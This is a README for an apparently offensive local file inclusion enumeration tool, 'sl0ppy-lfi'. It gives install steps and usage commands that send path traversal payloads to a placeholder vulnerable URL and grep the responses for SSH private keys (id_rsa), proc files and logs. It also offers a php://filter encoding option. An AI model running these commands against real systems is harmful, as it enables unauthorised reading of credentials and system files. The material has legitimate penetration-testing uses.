# sl0ppy-lfi
A small lfi enum tool, i upgraded the original source a bits here and there.  

# Added searches
* linux local files 
* linux log files 
* Linux proc files
* linux apache files
* linux .ssh files
* linux other files 

* windows local files
* windows log files
* windows config files
* windows other stuff    
* and alot more 

# install
# make all files executable 
* chmod +x install && ./install

# Usage 
# sl0ppy-lfi-fw  
# sl0ppy-lfi 

# Usage sl0ppy-lfi-fw (sl0ppy-lfi-framework)

## {!} change the static set user and hash out the read -p "Please Enter Systems Username: " on all 4 blocks {!}
* Or use the read -p submit system user 

# Usage 
* ./sl0ppy-lfi-fw 
* Choice 1 for windows based lfi file checks
* Choise 2 for linux based lfi file checks
* Cboise 3 for linux & windows lfi file checks
* choise 4 for PHP://filther encoding.. 
* Enter the lfi url whn it ask for it like this.. http://server.vulnerable.com/index.php?page=` 
* Else as http://server.vulnerable.com/index.php?page=../../../../../../../../../../
* Or any other lfi param or pages... 

# Usage sl0ppy-lfi 

# Enum all sl0ppy-lfi
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../` 


# Enum specific stuff like only libc
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "libc"`
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "id_rsa"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "libc"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "id_rsa"`

# Output Enum 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= > output && cat output`  

# sl0ppy-ProcessInfo
`./sl0ppy-ProcessInfo http://server.vulnerable.com/download.php?file=` 

# !Added php://filther encodiing! 

# Usage php://Filther-encoding 
* ./sl0ppy-lfi-fw option 4 enter url when it ask for it like this http://server.vulnerable.com/index.php
